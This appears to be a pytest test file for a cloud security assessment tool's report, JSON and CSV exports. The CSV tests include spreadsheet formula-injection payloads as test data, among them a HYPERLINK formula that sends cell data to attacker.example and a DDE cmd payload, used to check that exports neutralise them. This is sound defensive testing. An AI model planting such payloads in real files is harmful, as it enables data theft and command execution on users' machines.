"""Report dataset, JSON and CSV exports (no database needed)."""

import csv
import io
import json
import uuid
from datetime import UTC, datetime

import pytest

from app.domain.enums import CheckStatus, Provider, Severity
from app.reporting.exports import CSV_COLUMNS, neutralize_formula, to_csv, to_json
from app.reporting.report import (
    REPORT_SCHEMA_VERSION,
    AssessmentReport,
    ReportSource,
    build_report,
)
from app.reporting.schema import SCHEMA_PATH, render_schema
from app.rules.engine import RuleEngine
from app.sample_data import sample_aws_inventory
from tests.factories import ingress, inventory, security_group

GENERATED = datetime(2026, 2, 1, 12, 0, tzinfo=UTC)
SOURCE = ReportSource(
    consultancy="SubtleTech",
    client_name="Acme Ltd",
    assessment_id=uuid.uuid4(),
    assessment_name="Q1 AWS review",
    assessment_status="in_review",
    scan_id=uuid.uuid4(),
    scan_sha256="a" * 64,
)


@pytest.fixture
def report() -> AssessmentReport:
    return build_report(RuleEngine().run(sample_aws_inventory()), SOURCE, GENERATED)


def _csv_rows(data: bytes) -> list[dict[str, str]]:
    return list(csv.DictReader(io.StringIO(data.decode("utf-8-sig"))))


# ------------------------------------------------------------------ report dataset


def test_report_summary_matches_findings(report):
    assert report.schema_version == REPORT_SCHEMA_VERSION
    assert report.summary.total_findings == len(report.findings) == 3
    assert report.summary.by_severity[Severity.HIGH] == 3
    assert sum(report.summary.by_category.values()) == 3
    assert {(g.rule_id, g.affected_resources) for g in report.summary.by_rule} == {
        ("AWS-LOG-001", 1),
        ("NET-001", 1),
        ("NET-002", 1),
    }
    assert report.summary.checks_by_status[CheckStatus.ERROR] == len(report.not_evaluated)


def test_report_lists_what_was_not_evaluated(report):
    """The sample inventory simulates AccessDenied in us-east-1."""
    regions = {item.region for item in report.not_evaluated}
    assert "us-east-1" in regions
    assert any("AccessDenied" in item.reason for item in report.not_evaluated)


def test_report_carries_disclaimers(report):
    text = " ".join(report.notes)
    assert "does not certify compliance" in text
    assert "not evaluated" in text


def test_report_is_deterministic(report):
    again = build_report(RuleEngine().run(sample_aws_inventory()), SOURCE, GENERATED)
    assert [f.finding_id for f in again.findings] == [f.finding_id for f in report.findings]


# ------------------------------------------------------------------ JSON


def test_json_round_trips_exactly(report):
    assert AssessmentReport.model_validate_json(to_json(report)) == report


def test_json_uses_plain_values(report):
    data = json.loads(to_json(report))
    assert data["provider"] == "aws"
    assert data["summary"]["by_severity"]["high"] == 3
    assert data["source"]["client_name"] == "Acme Ltd"


def test_published_json_schema_is_up_to_date():
    assert SCHEMA_PATH.exists(), "run: python -m app.reporting.schema"
    assert SCHEMA_PATH.read_text(encoding="utf-8") == render_schema(), (
        "The report model changed: regenerate the schema with "
        "'python -m app.reporting.schema' and bump REPORT_SCHEMA_VERSION if needed."
    )


# ------------------------------------------------------------------ CSV


def test_csv_has_one_row_per_finding_most_severe_first(report):
    data = to_csv(report)
    assert data.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM for Excel on Windows
    rows = _csv_rows(data)

    assert list(rows[0].keys()) == list(CSV_COLUMNS)
    assert len(rows) == len(report.findings)
    assert [r["finding_id"] for r in rows] == [f.finding_id for f in report.findings]
    assert rows[0]["client"] == "Acme Ltd"


def test_csv_framework_columns_flag_unverified_references(report):
    [ssh] = [r for r in _csv_rows(to_csv(report)) if r["rule_id"] == "NET-001"]
    assert ssh["cis"] == "5.2 (unverified); 5.3 (unverified)"
    assert ssh["nist_csf"] == "PR.IR-01"
    assert ssh["soc2"] == "CC6.6 (unverified)"


@pytest.mark.parametrize(
    "value, expected",
    [
        ('=HYPERLINK("http://evil","x")', '\'=HYPERLINK("http://evil","x")'),
        ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("\tleading tab", "'\tleading tab"),
        ("\rcarriage", "'\rcarriage"),
        ("web-servers", "web-servers"),
        ("", ""),
    ],
)
def test_neutralize_formula(value, expected):
    assert neutralize_formula(value) == expected


def test_malicious_resource_names_cannot_become_formulas():
    """A client-controlled security group name must never execute in Excel."""
    malicious = '=HYPERLINK("http://attacker.example/?x="&A1,"Click")'
    result = RuleEngine().run(inventory(Provider.AWS, security_group(malicious, ingress(port=22))))
    rows = _csv_rows(to_csv(build_report(result, SOURCE, GENERATED)))

    [row] = [r for r in rows if r["rule_id"] == "NET-001"]
    assert row["resource_name"] == "'" + malicious
    for row in rows:
        for column, cell in row.items():
            assert not cell.startswith(("=", "+", "@", "\t", "\r")), (column, cell)
